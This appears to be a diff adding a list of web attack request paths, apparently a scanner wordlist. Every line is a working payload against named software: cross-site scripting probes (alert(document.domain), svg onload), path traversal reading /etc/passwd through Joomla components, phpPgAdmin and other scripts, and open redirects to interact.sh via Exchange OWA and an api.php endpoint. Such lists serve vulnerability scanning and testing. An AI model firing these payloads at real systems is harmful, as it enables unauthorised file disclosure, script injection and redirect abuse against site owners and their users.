@@ -1,0 +1,14 @@
+/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/exchweb/bin/redir.asp?URL=https://interact.sh
+/CookieAuth.dll?GetLogon?url=%2Fexchweb%2Fbin%2Fredir.asp%3FURL%3Dhttps%3A%2F%2Finteract.sh&reason=0
+/index.php?appservlang=%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+/index.php?option=com_extplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd
+/phpPgAdmin/index.php?_language=../../../../../../../../etc/passwd%00
+/components/com_ionfiles/download.php?file=../../../../../../../../etc/passwd&download=1
+/components/com_rwcards/captcha/captcha_image.php?img=../../../../../../../../../etc/passwd%00
+/index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd
+/webshell4/login.php?errcode=0&login=\%22%20onfocus=alert(document.domain);%20autofocus%20\%22&err=U
+/comm.php?id=../../../../../../../../../../etc/passwd
+/viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd
+/index.php?currentpath=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/api.php?action=logout&forward=http://interact.sh
